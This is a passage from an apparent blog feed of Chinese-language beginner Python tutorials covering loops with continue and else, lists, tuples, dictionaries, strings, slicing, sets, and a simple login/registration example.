希望执行本次循环代码（跳过本次循环），但可进入下一次循环判断，可以使用 <code>continue</code></li></ul><p>需求：跑步10圈，到第5圈休息一下，第6圈继续</p><pre><code class="python">&quot;&quot;&quot;步骤流程：1. 定义一个条件变量，一般赋值为02. while 判断条件：    3. if 满足条件：        3.1 打印：累了，休息1圈        3.2 条件变量的改变【非常重要】，如果没有，导致死循环        3.3 continue跳过本次循环    4. 打印跑步第几圈    5. 条件变量的改变【非常重要】&quot;&quot;&quot;# 1. 定义一个条件变量，一般赋值为0i = 0# 2. while 判断条件：while i &lt; 10:    # 3. if 满足条件：    if i == 4:        # 3.1 打印：累了，休息1圈        print(&#39;累了，休息1圈&#39;)        # 3.2 条件变量的改变【非常重要】，如果没有，导致死循环        i += 1        # 3.3 continue跳过本次循环        continue    # 4. 打印跑步第几圈    print(&#39;跑步第%d圈&#39; % (i+1))    # 5. 条件变量的改变【非常重要】    i += 1print(&#39;循环的外面&#39;)</code></pre><ul><li>需要注意：使用 <code>continue</code> 时，<strong>条件处理部分的代码，需要特别注意</strong>，不小心会出现 <strong>死循环</strong></li></ul><p>运行结果：</p><pre><code class="python">跑步第1圈跑步第2圈跑步第3圈跑步第4圈累了，休息1圈跑步第6圈跑步第7圈跑步第8圈跑步第9圈跑步第10圈循环的外面</code></pre><h3 id="2-循环的else"><a href="#2-循环的else" class="headerlink" title="2. 循环的else"></a>2. 循环的else</h3><h4 id="2-1-循环的else"><a href="#2-1-循环的else" class="headerlink" title="2.1 循环的else"></a>2.1 循环的else</h4><ul><li>循环也可以支持else使用</li><li>循环里面没有遇到break语句，while执行完后，则会执行else的分支</li></ul><p>示例代码：</p><pre><code class="python">i = 0while i &lt; 5:    print(&#39;跑步第%d圈&#39; % (i+1))    # 测试有break，和没有break的else执行情况    # if i == 3:    #     break    i += 1else:    print(&#39;循环里面没有遇到break语句，while执行完后，则会执行else的分支&#39;)</code></pre><p>运行结果：</p><pre><code class="shell">跑步第1圈跑步第2圈跑步第3圈跑步第4圈跑步第5圈循环里面没有遇到break语句，while执行完后，则会执行else的分支</code></pre><h4 id="2-2-if…else-和-循环-else-的区别"><a href="#2-2-if…else-和-循环-else-的区别" class="headerlink" title="2.2 if…else 和 循环 else 的区别"></a>2.2 if…else 和 循环 else 的区别</h4><ul><li>if…else：<ul><li>不满足if条件的前提下，执行else操作</li><li>两者只会执行一个分支</li></ul></li><li>循环 else：<ul><li>循环里面没有遇到break语句，while执行完后，则会执行else的分支</li><li>也就是说，没有遇到break，不仅会执行while的语句，也会执行else的语句</li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pyhon </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python基础03-容器类型</title>
      <link href="/2020/07/26/2020-07-27-python%E5%9F%BA%E7%A1%8003-%E5%AE%B9%E5%99%A8%E7%B1%BB%E5%9E%8B/"/>
      <url>/2020/07/26/2020-07-27-python%E5%9F%BA%E7%A1%8003-%E5%AE%B9%E5%99%A8%E7%B1%BB%E5%9E%8B/</url>
      
        <content type="html"><![CDATA[<h1 id="容器类型"><a href="#容器类型" class="headerlink" title="容器类型"></a>容器类型</h1><h2 id="一、列表"><a href="#一、列表" class="headerlink" title="一、列表"></a>一、列表</h2><h3 id="1-列表的定义"><a href="#1-列表的定义" class="headerlink" title="1. 列表的定义"></a>1. 列表的定义</h3><a id="more"></a><ul><li><code>list</code>（列表） 是 <code>Python</code> 中使用 <strong>最频繁</strong> 的数据类型</li><li>专门用于存储 <strong>一串 数据</strong>，存储的数据 称为 <strong>元素</strong></li><li>列表用 <code>[]</code> 定义，<strong>元素</strong> 之间使用 <code>,</code> 分隔</li><li>列表的索引从0开始<ul><li><strong>索引</strong> 就是元素在 <strong>列表</strong> 中的位置编号</li></ul></li></ul><pre><code class="python">&quot;&quot;&quot;列表定义的格式：列表变量的名字 = [元素1, 元素2, ……]使用格式：    列表变量[位置]    位置：也叫下标、索引&quot;&quot;&quot;# 列表定义name_list = [&#39;mike&#39;, &#39;yoyo&#39;, &#39;rock&#39;, &#39;lily&#39;]#              0       1        2       3#             -4       -3      -2       -1# 最后一个元素取出来print(name_list[3])print(name_list[-1])# 访问列表元素，不要超出范围，不要越界# IndexError: list index out of range# print(name_list[4])</code></pre><ul><li>注意：从列表中取值时，如果 <strong>超出索引范围</strong>，程序会报错</li></ul><h3 id="2-列表嵌套"><a href="#2-列表嵌套" class="headerlink" title="2. 列表嵌套"></a>2. 列表嵌套</h3><ul><li>一个列表中的元素又是列表，那么这就是列表的嵌套</li></ul><pre><code class="python">school_list = [[&#39;北京大学&#39;, &#39;清华大学&#39;], [&#39;中山大学&#39;, &#39;华南理工大学&#39;], [&#39;哈工大&#39;, &#39;哈工程&#39;]]#                  0                      1                         2# 取出第 2 个元素，也就是索引为1的元素print(school_list[1])  # [&#39;中山大学&#39;, &#39;华南理工大学&#39;]# 先取出索引为1的元素，再继续索引为1的元素# [&#39;中山大学&#39;, &#39;华南理工大学&#39;]#   0            1print(school_list[1][1])  # &#39;华南理工大学&#39;</code></pre><h3 id="3-列表常用操作"><a href="#3-列表常用操作" class="headerlink" title="3. 列表常用操作"></a>3. 列表常用操作</h3><table><thead><tr><th>分类</th><th>关键字 / 函数 / 方法</th><th>说明</th></tr></thead><tbody><tr><td>增加</td><td><a href="method/append.html">列表.append(值)</a></td><td>在末尾追加数据</td></tr><tr><td>删除</td><td><a href="method/remove.html">列表.remove(值)</a></td><td>删除第一个出现的指定数据</td></tr><tr><td>修改</td><td><a href="method/索引赋值.html">列表[索引] = 值</a></td><td>修改指定索引的数据，数据不存在会报错</td></tr><tr><td>查询</td><td><a href="method/索引取值.html">列表[索引]</a></td><td>根据索引取值，索引不存在会报错</td></tr><tr><td></td><td><a href="method/len.html">len(列表)</a></td><td>列表长度(元素个数)</td></tr><tr><td></td><td><a href="method/if_in.html">if 值 in 列表:</a></td><td>判断列表中是否包含某个值</td></tr><tr><td>排序</td><td><a href="method/sort.html">列表.sort()</a></td><td>升序排序</td></tr></tbody></table><ul><li><a href="07_语法汇总.html">全部方法列表</a></li></ul><h3 id="4-循环遍历"><a href="#4-循环遍历" class="headerlink" title="4. 循环遍历"></a>4. 循环遍历</h3><h4 id="4-1-通过for循环遍历"><a href="#4-1-通过for循环遍历" class="headerlink" title="4.1 通过for循环遍历"></a>4.1 通过for循环遍历</h4><ul><li><strong>遍历</strong> 就是 <strong>从头到尾</strong> <strong>依次</strong> 从 <strong>列表</strong> 中取出 <strong>每一个元素</strong></li><li>Python中专门提供 <strong>for循环</strong> 实现遍历</li></ul><pre><code class="python"># 遍历，从头开始找，直到结束name_list = [&#39;mike&#39;, &#39;yoyo&#39;, &#39;rock&#39;, &#39;lily&#39;]# 通过while实现遍历# 1. 定义条件变量i = 0i = 0# 2. while i &lt; 列表元素个数:while i &lt; len(name_list):    # 3. 取出某个元素，打印    name = name_list[i]    print(name)    # 4. 条件变量的修改    i += 1print(&#39;==========华丽分割线=============&#39;)# for遍历循环，和上面的while效果等价# 从头到尾 依次从 列表 中取出 每一个元素for name in name_list:    print(name)</code></pre><h4 id="4-2-if…in-和-for…in-的区别"><a href="#4-2-if…in-和-for…in-的区别" class="headerlink" title="4.2 if…in 和 for…in 的区别"></a>4.2 if…in 和 for…in 的区别</h4><ul><li>if…in：判断某个元素是否在列表中，如果在，if的条件为True</li><li>for…in：从头到尾 依次从 列表 中取出 每一个元素</li></ul><pre><code class="python">name_list = [&#39;mike&#39;, &#39;yoyo&#39;, &#39;rock&#39;, &#39;lily&#39;]# if…in：判断某个元素是否在列表中，如果在，if的条件为Truename = &#39;yoyo&#39;# name的内容&#39;yoyo&#39;是否在name_list列表中，如果在，name in name_list结果为Trueif name in name_list:    print(&#39;%s 在列表中&#39; % name)print(&#39;==========华丽分割线=============&#39;)# for…in：从头到尾 依次从 列表 中取出 每一个元素，这个元素给name赋值for name in name_list:    print(name)</code></pre><p>运行结果：</p><pre><code class="shell">yoyo 在列表中==========华丽分割线=============mikeyoyorocklily</code></pre><h4 id="4-3-for…else的使用"><a href="#4-3-for…else的使用" class="headerlink" title="4.3 for…else的使用"></a>4.3 for…else的使用</h4><ul><li>for循环里面没有遇到break语句，for执行完后，则会执行else的分支</li></ul><pre><code class="python">name_list = [&#39;mike&#39;, &#39;yoyo&#39;, &#39;rock&#39;, &#39;lily&#39;]for name in name_list:    print(name)    # 测试有break，和没有break的else执行情况    # if name == &#39;yoyo&#39;:    #     breakelse:    print(&#39;for循环里面没有遇到break语句，for执行完后，则会执行else的分支&#39;)</code></pre><p>运行结果：</p><pre><code class="python">mikeyoyorocklilyfor循环里面没有遇到break语句，for执行完后，则会执行else的分支</code></pre><h2 id="二、元组"><a href="#二、元组" class="headerlink" title="二、元组"></a>二、元组</h2><h3 id="1-元组的定义"><a href="#1-元组的定义" class="headerlink" title="1. 元组的定义"></a>1. 元组的定义</h3><ul><li>元组用 <code>()</code> 定义</li><li>用于存储 <strong>一串 数据</strong>，<strong>元素</strong> 之间使用 <code>,</code> 分隔</li><li>元组的 <strong>索引</strong> 从 <code>0</code> 开始</li></ul><pre><code class="python"># 列表：列表变量 = [元素1, 元素2, ……]# 元组：元组变量 = (元素1, 元素2, ……)my_tuple = (&#39;mike&#39;, &#39;yoyo&#39;, &#39;lily&#39;)#             0       1        2# 取出第0个元素print(my_tuple[0])  # 输出：&#39;mike&#39;</code></pre><ul><li>元组中 <strong>只包含一个元素</strong> 时，需要 <strong>在元素后面添加逗号</strong></li></ul><pre><code class="python"># 元组只有一个元素的时候，格式: (元素,)my_tuple1 = (250,)# 打印my_tuple1的类型print(type(my_tuple1))</code></pre><h3 id="2-元组常用操作"><a href="#2-元组常用操作" class="headerlink" title="2. 元组常用操作"></a>2. 元组常用操作</h3><ul><li><code>tuple</code>（元组）与列表类似，不同之处在于元组的 <strong>元素不能修改</strong></li></ul><pre><code class="python">my_tuple = (&#39;mike&#39;, &#39;yoyo&#39;, &#39;lily&#39;)# 元组只读不能改# TypeError: &#39;tuple&#39; object does not support item assignment# my_tuple[0] = &#39;rock&#39; # err</code></pre><table><thead><tr><th align="left">分类</th><th align="left">关键字 / 函数 / 方法</th><th align="left">说明</th></tr></thead><tbody><tr><td align="left">查询</td><td align="left"><a href="method/索引取值_元组.html">元组[索引]</a></td><td align="left">根据索引取值，索引不存在会报错</td></tr><tr><td align="left"></td><td align="left"><a href="method/len_元组.html">len(元组)</a></td><td align="left">元组长度(元素个数)</td></tr><tr><td align="left"></td><td align="left"><a href="method/if_in_元组.html">if 值 in 元组:</a></td><td align="left">判断元组中是否包含某个值</td></tr></tbody></table><h2 id="三、字典"><a href="#三、字典" class="headerlink" title="三、字典"></a>三、字典</h2><h3 id="1-字典的定义"><a href="#1-字典的定义" class="headerlink" title="1. 字典的定义"></a>1. 字典的定义</h3><ul><li>字典同样可以用来</li></ul><p>  存储多个数据</p><ul><li>通常用于存储 <strong>描述一个 <code>物体</code> 的相关信息</strong></li></ul><ul><li><p>字典用 <code>{}</code> 定义</p></li><li><p>字典使用 键值对 存储数据，键值对之间使用’,’分隔</p><ul><li><strong>键</strong> <code>key</code> 是索引，<strong>值</strong> <code>value</code> 是数据</li><li><strong>键</strong> 和 <strong>值</strong> 之间使用 <code>:</code> 分隔</li><li><strong>值</strong> 可以取任何数据类型，但 <strong>键</strong> 只能使用 <strong>字符串</strong>、<strong>数字</strong>或 <strong>元组</strong></li><li><strong>键必须是唯一的</strong></li></ul></li></ul><pre><code class="python">&quot;&quot;&quot;字典定义格式：    字典变量 = {k1:v1, k2:v2,……}取出元素的值：    字典变量[键值]&quot;&quot;&quot;# 字典的定义info = {&#39;name&#39;: &#39;mike&#39;, &#39;age&#39;: 34, &#39;city&#39;: &#39;sz&#39;}print(info)  # {&#39;name&#39;: &#39;mike&#39;, &#39;age&#39;: 34, &#39;city&#39;: &#39;sz&#39;}# 取出元素的值：字典变量[键值]print(info[&#39;city&#39;])</code></pre><h3 id="2-字典常用操作"><a href="#2-字典常用操作" class="headerlink" title="2. 字典常用操作"></a>2. 字典常用操作</h3><table><thead><tr><th>分类</th><th>关键字 / 函数 / 方法</th><th>说明</th></tr></thead><tbody><tr><td>增加</td><td><a href="method/增加键值_字典.html">字典[键] = 值</a></td><td>键不存在，会添加键值对</td></tr><tr><td>删除</td><td><a href="method/删除键值_字典.html">字典.pop(键)</a></td><td>删除指定键值对,返回被删除的值,如果键不存在,会报错</td></tr><tr><td>修改</td><td><a href="method/修改键值_字典.html">字典[键] = 值</a></td><td>键存在，会修改键值对的值</td></tr><tr><td>查询</td><td><a href="method/查询值_字典.html">字典[键]</a></td><td>根据键取值，键值对不存在会报错</td></tr><tr><td></td><td><a href="method/get_字典.html">字典.get(键)</a></td><td>根据键取值，键值对不存在返回None, 不会报错</td></tr><tr><td></td><td><a href="method/字典_items.html">for key, value in 字典.items()</a></td><td>遍历字典, 获取所有的键值对 (键, 值)</td></tr></tbody></table><h3 id="3-案例：登录注册系统"><a href="#3-案例：登录注册系统" class="headerlink" title="3. 案例：登录注册系统"></a>3. 案例：登录注册系统</h3><ul><li><p>在开发中，字典的应用场景是：</p><ul><li><p>使用 <strong>多个键值对</strong>，存储 <strong>描述一个 <code>物体</code> 的相关信息</strong> —— 描述更复杂的数据信息</p></li><li><p>将 <strong>多个字典</strong> 放在 <strong>一个列表</strong> 中，再进行遍历，在循环体内部针对每一个字典进行 <strong>相同的处理</strong></p><pre><code class="python">用户1: {&#39;name&#39;: &#39;mike&#39;, &#39;pwd&#39;:123456}用户2: {&#39;name&#39;: &#39;yoyo&#39;, &#39;pwd&#39;:123456}用户管理列表：user_list = [{&#39;name&#39;: &#39;mike&#39;, &#39;pwd&#39;:123456}, {&#39;name&#39;: &#39;yoyo&#39;, &#39;pwd&#39;:123456}]</code></pre></li></ul></li><li><p>登录注册系统需求：完成用户注册、用户登录功能</p></li></ul><pre><code class="python">&quot;&quot;&quot;登录注册系统需求：1.用户注册/ 2.用户登录/ 3.退出程序0. 定义一个列表，用于存储用户字典1. 死循环 while True:    2. 输入数字指令    3. 判断指令，选择分支    4. 用户注册功能        4.1 输入注册的用户名        4.2 通过for遍历列表，取出的每个元素是字典            4.3 字典[&#39;name&#39;]和输入注册的用户名比较是否相等                4.4 如果相等，打印提示：名字在列表中，不允许注册                4.5 跳出循环        4.6 for循环的else，循环里面没有执行到break，则会执行else            4.7 输入注册的密码            4.8 创建一个字典            4.9 字典追加到列表中            4.10 打印：注册成功    5. 用户登陆功能        5.1 输入登陆的用户名和密码        5.2 通过for遍历列表，取出的每个元素是字典            5.3 字典[&#39;name&#39;]和登陆用户名比较 and 字典[&#39;pwd&#39;]和登陆密码比较                5.4 如果都相等，打印提示：登陆成功                5.5 跳出循环        5.6 for循环的else，循环里面没有执行到break，则会执行else            5.7 打印：用户名或密码错误，请重新登陆&quot;&quot;&quot;# 0. 定义一个列表，用于存储用户字典user_list = [{&#39;name&#39;: &#39;mike&#39;, &#39;pwd&#39;: 123456}, {&#39;name&#39;: &#39;yoyo&#39;, &#39;pwd&#39;: 123456}]# 1. 死循环 while True:while True:    #  2. 输入数字指令    cmd_num = input(&quot;请输入操作: 1.用户注册/ 2.用户登录/ 3.退出程序&quot;)    # 3. 判断指令，选择分支    # 4. 用户注册功能    if cmd_num == &quot;1&quot;:        # print(&#39;用户注册&#39;)        # 4.1 输入注册的用户名        reg_name = input(&#39;请输入注册的名字：&#39;)        # 4.2 通过for遍历列表，取出的每个元素是字典        for user_dict in user_list:            # 4.3 字典[&#39;name&#39;]和输入注册的用户名比较是否相等            if user_dict[&#39;name&#39;] == reg_name:                # 4.4 如果相等，打印提示：名字在列表中，不允许注册                print(reg_name, &#39;名字在列表中，不允许注册&#39;)                # 4.5 跳出循环                break        # 4.6 for循环的else，循环里面没有执行到break，则会执行else        else:            # 4.7 输入注册的密码            reg_pwd = input(&#39;请输入注册的密码：&#39;)            # 4.8 创建一个字典            user_dict = {&#39;name&#39;: reg_name, &#39;pwd&#39;: reg_pwd}            # 4.9 字典追加到列表中            user_list.append(user_dict)            # 4.10 打印：注册成功            print(&#39;注册成功&#39;)    # 5. 用户登陆功能    elif cmd_num == &quot;2&quot;:        # print(&#39;用户登录&#39;)        # 5.1 输入登陆的用户名和密码        login_name = input(&#39;请输入登录用户名:&#39;)        login_pwd = int(input(&#39;请输入登录密码:&#39;)) # 密码要转换为整型        # 5.2 通过for遍历列表，取出的每个元素是字典        for user_dict in user_list:            # 5.3 字典[&#39;name&#39;]和登陆用户名比较 and 字典[&#39;pwd&#39;]和登陆密码比较            if user_dict[&#39;name&#39;] == login_name and user_dict[&#39;pwd&#39;] == login_pwd:                # 5.4 如果都相等，打印提示：登陆成功                print(&#39;登陆成功&#39;)                # 5.5 跳出循环                break        # 5.6 for循环的else，循环里面没有执行到break，则会执行else        else:            # 5.7 打印：用户名或密码错误，请重新登陆            print(&#39;用户名或密码错误，请重新登陆&#39;)    elif cmd_num == &quot;3&quot;:        print(&#39;退出程序&#39;)        break    else:        print(&quot;输入错误，重新输入&quot;</code></pre><h2 id="四、字符串"><a href="#四、字符串" class="headerlink" title="四、字符串"></a>四、字符串</h2><h3 id="1-字符串的定义"><a href="#1-字符串的定义" class="headerlink" title="1. 字符串的定义"></a>1. 字符串的定义</h3><ul><li><strong>字符串</strong> 就是 <strong>一串字符</strong>，是编程语言中表示文本的数据类型</li><li>在 Python 中可以使用 <strong>一对双引号</strong> <code>&quot;</code> 或者 <strong>一对单引号</strong> <code>&#39;</code> 定义一个字符串 或者 <strong>一对三引号</strong> <code>&#39;&#39;&#39;</code> 定义一个字符串</li><li>可以使用 <strong>索引</strong> 获取一个字符串中 <strong>指定位置的字符</strong>，索引计数从 <strong>0</strong> 开始</li><li>也可以使用 <code>for</code> <strong>循环遍历</strong> 字符串中每一个字符</li></ul><pre><code class="python">&quot;&quot;&quot;字符串变量 = &#39;字符串内容&#39;说明：可以是单引号、双引号、三引号&quot;&quot;&quot;my_str = &#39;python&#39;#         012345# 取某个元素，和列表一样print(my_str[0])# 遍历取所有元素for c in my_str:    print(c)</code></pre><h3 id="2-f-strings-字符串格式化"><a href="#2-f-strings-字符串格式化" class="headerlink" title="2. f-strings 字符串格式化"></a>2. f-strings 字符串格式化</h3><ul><li><code>f-strings</code>是Python 3.6之后的一种新的字符串格式化方法，要使用f-strings，只需在字符串前加上f、或F：</li></ul><pre><code class="python">name = &#39;mike&#39;age = 34sex = &#39;male&#39;# 传统方式格式化print(&#39;我叫%s, 年龄为%d, 性别为：%s&#39; % (name, age, sex))# 和上面打印效果一样print(f&#39;我叫{name}, 年龄为{age}, 性别为：{sex}&#39;)print(F&#39;我叫{name}, 年龄为{age}, 性别为：{sex}&#39;)</code></pre><h3 id="3-字符串的常用操作"><a href="#3-字符串的常用操作" class="headerlink" title="3. 字符串的常用操作"></a>3. 字符串的常用操作</h3><table><thead><tr><th>分类</th><th>关键字 / 函数 / 方法</th><th>说明</th></tr></thead><tbody><tr><td>查找</td><td><a href="method/字符串_find.html">字符串.find(目标字符串, 开始索引, 结束索引)</a></td><td>在指定范围内, 查询目标字符串的索引, 不存在返回-1</td></tr><tr><td>替换</td><td><a href="method/字符串_replace.html">字符串.replace(原内容, 新内容, 替换次数)</a></td><td>返回一个替换了原内容的新字符串，可以指定替换次数</td></tr><tr><td>分割</td><td><a href="method/字符串_split.html">字符串.split(分割符)</a></td><td>以分割符拆分字符串, 返回列表</td></tr><tr><td>拼接</td><td><a href="method/字符串_+.html">字符串 + 字符串</a></td><td>拼接两个字符串</td></tr><tr><td></td><td><a href="method/字符串_join.html">字符串.join(字符串列表)</a></td><td>以字符串来连接字符串列表中每个元素，合并为一个新的字符串</td></tr></tbody></table><h3 id="4-字符串的切片"><a href="#4-字符串的切片" class="headerlink" title="4. 字符串的切片"></a>4. 字符串的切片</h3><h4 id="4-1-切片介绍"><a href="#4-1-切片介绍" class="headerlink" title="4.1 切片介绍"></a>4.1 切片介绍</h4><ul><li><p><strong>切片</strong> 译自英文单词 <code>slice</code>，翻译成另一个解释更好理解: <strong>一部分</strong></p></li><li><p><strong>切片</strong> 使用 <strong>索引值</strong> 来限定范围，根据 <strong>步长</strong> 从原序列中 <strong>取出一部分</strong> 元素组成新序列</p></li><li><p><strong>切片</strong> 方法适用于 <strong>字符串</strong>、<strong>列表</strong>、<strong>元组</strong></p><pre><code>字符串[开始索引:结束索引:步长]</code></pre></li></ul><p><strong>注意</strong>：</p><ol><li>指定的区间属于左闭右开型[开始索引, 结束索引)对应开始索引 &lt;= 范围 &lt; 结束索引<ul><li>从 <code>起始</code> 位开始，到 <strong><code>结束</code>位的前一位</strong> 结束（<strong>不包含结束位本身</strong>)</li></ul></li><li>从头开始，<strong>开始索引</strong> <strong>数字可以省略，冒号不能省略</strong></li><li>到末尾结束，<strong>结束索引</strong> <strong>数字和冒号都可以省略</strong></li><li>步长：理解为走的步数，正数说明是从左往右，负数是从右往左，默认步长为+1<ul><li>步长默认为 <code>1</code>，如果元素连续，<strong>数字和冒号都可以省略</strong></li></ul></li></ol><h4 id="4-2-案例"><a href="#4-2-案例" class="headerlink" title="4.2 案例"></a>4.2 案例</h4><p><strong>演练需求</strong></p><ol><li>截取从 2 ~ 5 位置 的字符串</li><li>截取从 2 ~ <code>末尾</code> 的字符串</li><li>截取从 <code>开始</code> ~ 5 位置 的字符串</li><li>从开始位置，每隔一个字符截取字符串</li><li>截取字符串末尾两个字符</li><li>字符串的逆序（面试题）</li></ol><p>示例代码：</p><pre><code class="python">&quot;&quot;&quot;字符串[开始索引:结束索引:步长]0. 步长默认为1，步长理解为走几步，正数从左往右，负数从右往左1. 字符串[开始索引:结束索引]   开始索引 ~（结束索引-1）2. 字符串[开始索引: ]       开始索引 ~ 结束索引，末尾索引不写，默认能取到末尾那个索引3. 字符串[ :结束索引]       0 ~（结束索引-1），开始索引不写，默认从第0个元素开始&quot;&quot;&quot;temp_str = &#39;12345678&#39;#           01234567#                -2-1# 站在用户角度，第1个元素才开始算第1个位置# 截取从 2 ~ 5 位置 的字符串print(temp_str[1:5])# 截取从 2 ~ 末尾 的字符串print(temp_str[1:]) # 没有指定结尾索引，默认取到末尾# 截取从 开始 ~ 5 位置 的字符串print(temp_str[:5]) # 没有指定开头索引，默认从0开始# 从开始位置，每隔一个字符截取字符串，也就是说走2步print(temp_str[::2]) # 没有指定开头、结尾索引，默认从头到尾# 截取字符串末尾两个字符print(temp_str[-2:])  # 没有指定结尾索引，默认取到末尾# 字符串的逆序（面试题）print(temp_str[::-1])</code></pre><h2 id="五、集合"><a href="#五、集合" class="headerlink" title="五、集合"></a>五、集合</h2><h3 id="1-通过集合完成对列表去重功能"><a href="#1-通过集合完成对列表去重功能" class="headerlink" title="1. 通过集合完成对列表去重功能"></a>1. 通过集合完成对列表去重功能</h3><ul><li>集合用 <code>{}</code> 定义，<strong>元素</strong> 之间使用 <code>,</code> 分隔</li><li>可通过集合对列表中的元素完成去重功能</li></ul><pre><code class="python"># 集合：元素不会重复，{元素1，元素2……}# 定义集合my_set = {1, 2, 1, 2, 1, 2}print(my_set)  # {1, 2}print(type(my_set))  # &lt;class &#39;set&#39;&gt;# 通过集合完成对列表去重功能name_list = [&#39;mike&#39;, &#39;yoyo&#39;, &#39;mike&#39;]# set(name_list)：给列表转换为set类型，即可完成去重功能temp_set = set(name_list)print(temp_set)  # {&#39;mike&#39;, &#39;yoyo&#39;}</code></pre><h3 id="2-list、tuple、set之间类型转换"><a href="#2-list、tuple、set之间类型转换" class="headerlink" title="2. list、tuple、set之间类型转换"></a>2. list、tuple、set之间类型转换</h3><table><thead><tr><th>函数</th><th>说明</th></tr></thead><tbody><tr><td>list(x)</td><td>将 x 转换为列表类型</td></tr><tr><td>tuple(x)</td><td>将 x 转换为元组类型</td></tr><tr><td>set(x)</td><td>将 x 转换为集合类型</td></tr></tbody></table><p>示例代码：</p><pre><code class="python"># 列表转元组、集合 类型my_list = [1, 2, 3, 5, 3, 5]# 列表转换为元组类型my_tuple = tuple(my_list)print(my_tuple)  # (1, 2, 3, 5, 3, 5)# 列表转换为集合类型my_set = set(my_list)print(my_set)   # {1, 2, 3, 5}print(&#39;============华丽分割线============&#39;)# 元组转列表、集合 类型my_tuple = (1, 2, 3, 5, 3, 5)# 元组转换为列表 类型my_list = list(my_tuple)print(my_list)  # [1, 2, 3, 5, 3, 5]# 元组转换为集合 类型my_set = set(my_tuple)print(my_set)   # {1, 2, 3, 5}print(&#39;============华丽分割线============&#39;)# 集合转元组、列表 类型my_set = {1, 2, 3}# 集合转换为列表 类型my_list = list(my_set)print(my_list)  # [1, 2, 3]# 集合转换为元组 类型my_tuple = tuple(my_set)print(my_tuple)  # (1, 2, 3)</code></pre><h2 id="六、公共语法"><a href="#六、公共语法" class="headerlink" title="六、公共语法"></a>六、公共语法</h2><h3 id="1-Python-内置函数"><a href="#1-Python-内置函数" class="headerlink" title="1. Python 内置函数"></a>1. Python 内置函数</h3><p>Python 包含了以下内置函数：</p><table><thead><tr><th>函数</th><th>描述</th><th>备注</th></tr></thead><tbody><tr><td>len(item)</td><td>计算容器中元素个数</td><td></td></tr><tr><td>max(item)</td><td>返回容器中元素最大值</td><td>如果是字典，只针对 key 比较</td></tr><tr><td>min(item)</td><td>返回容器中元素最小值</td><td>如果是字典，只针对 key 比较</td></tr></tbody></table><h3 id="2-切片"><a href="#2-切片" class="headerlink" title="2. 切片"></a>2. 切片</h3><table><thead><tr><th align="center">描述</th><th align="left">Python 表达式</th><th align="left">结果</th><th align="left">支持的数据类型</th></tr></thead><tbody><tr><td align="center">切片</td><td align="left">[1, 2, 3, 4][::2]</td><td align="left">[1, 3]</td><td align="left">字符串、列表、元组</td></tr></tbody></table><h3 id="3-运算符"><a href="#3-运算符" class="headerlink" title="3. 运算符"></a>3. 运算符</h3><table><thead><tr><th align="center">运算符</th><th>Python 表达式</th><th>结果</th><th>描述</th><th>支持的数据类型</th></tr></thead><tbody><tr><td align="center">+</td><td>[1, 2] + [3, 4]</td><td>[1, 2, 3, 4]</td><td>合并</td><td>字符串、列表、元组</td></tr><tr><td align="center">*</td><td>[1, 2] * 2</td><td>[1, 2, 1, 2]</td><td>重复</td><td>字符串、列表、元组</td></tr><tr><td align="center">in</td><td>3 in (1, 2, 3)</td><td>True</td><td>元素是否存在</td><td>字符串、列表、元组、字典</td></tr><tr><td align="center">not in</td><td>4 not in (1, 2, 3)</td><td>True</td><td>元素是否不存在</td><td>字符串、列表、元组、字典</td></tr><tr><td align="center">&gt; &gt;= == &lt; &lt;=</td><td>(1, 2, 6) &lt; (1, 3, 4)</td><td>True</td><td>元素比较</td><td>字符串、列表、元组</td></tr></tbody></table><p><strong>注意</strong></p><ul><li><code>in</code> 在对 <strong>字典</strong> 操作时，判断的是 <strong>字典的键</strong></li><li><code>in</code> 和 <code>not in</code> 被称为 <strong>成员运算符</strong></li></ul><h2 id="七、容器常用方法汇总"><a href="#七、容器常用方法汇总" class="headerlink" title="七、容器常用方法汇总"></a>七、容器常用方法汇总</h2><h3 id="1-列表操作"><a href="#1-列表操作" class="headerlink" title="1. 列表操作"></a>1. 列表操作</h3><table><thead><tr><th align="left">分类</th><th align="left">关键字 / 函数 / 方法</th><th align="left">说明</th></tr></thead><tbody><tr><td align="left">增加</td><td align="left"><a href="method/append.html">列表.append(值)</a></td><td align="left">在末尾追加值</td></tr><tr><td align="left"></td><td align="left"><a href="method/insert.html">列表.insert(索引, 值)</a></td><td align="left">在指定位置插入值, 超过索引会追加值</td></tr><tr><td align="left"></td><td align="left"><a href="method/extend.html">列表.extend(可迭代对象)</a></td><td align="left">将可迭代对象 中 的元素 追加到列表</td></tr><tr><td align="left">删除</td><td align="left"><a href="method/remove.html">列表.remove(值)</a></td><td align="left">删除指定值的 第一个匹配项</td></tr><tr><td align="left"></td><td align="left"><a href="method/del.html">del 列表[索引]</a></td><td align="left">删除指定位置的值</td></tr><tr><td align="left"></td><td align="left"><a href="method/pop.html">列表.pop(索引)</a></td><td align="left">删除指定索引的值, 并返回被删除的值</td></tr><tr><td align="left"></td><td align="left"><a href="method/clear.html">列表.clear()</a></td><td align="left">清空列表</td></tr><tr><td align="left">修改</td><td align="left"><a href="method/索引赋值.html">列表[索引] = 值</a></td><td align="left">修改指定索引的值，索引不存在会报错</td></tr><tr><td align="left">查询</td><td align="left"><a href="method/索引取值.html">列表[索引]</a></td><td align="left">根据索引取值，索引不存在会报错</td></tr><tr><td align="left"></td><td align="left"><a href="method/len.html">len(列表)</a></td><td align="left">列表长度(元素个数)</td></tr><tr><td align="left"></td><td align="left"><a href="method/if_in.html">if 值 in 列表:</a></td><td align="left">判断列表中是否包含某个值</td></tr><tr><td align="left"></td><td align="left"><a href="method/index1.html">列表.index(值)</a></td><td align="left">根据值查询索引，返回 第一个匹配项 的索引，没有查到会报错</td></tr><tr><td align="left"></td><td align="left"><a href="method/count.html">列表.count(值)</a></td><td align="left">值在列表中出现的次数</td></tr><tr><td align="left">排序</td><td align="left"><a href="method/sort.html">列表.sort()</a></td><td align="left">排序</td></tr><tr><td align="left"></td><td align="left"><a href="method/reverse.html">列表.reverse()</a></td><td align="left">逆序、反转</td></tr></tbody></table><h3 id="2-元组操作"><a href="#2-元组操作" class="headerlink" title="2. 元组操作"></a>2. 元组操作</h3><table><thead><tr><th align="left">分类</th><th align="left">关键字 / 函数 / 方法</th><th align="left">说明</th></tr></thead><tbody><tr><td align="left">查询</td><td align="left"><a href="method/索引取值_元组.html">元组[索引]</a></td><td align="left">根据索引取值，索引不存在会报错</td></tr><tr><td align="left"></td><td align="left"><a href="method/len_元组.html">len(元组)</a></td><td 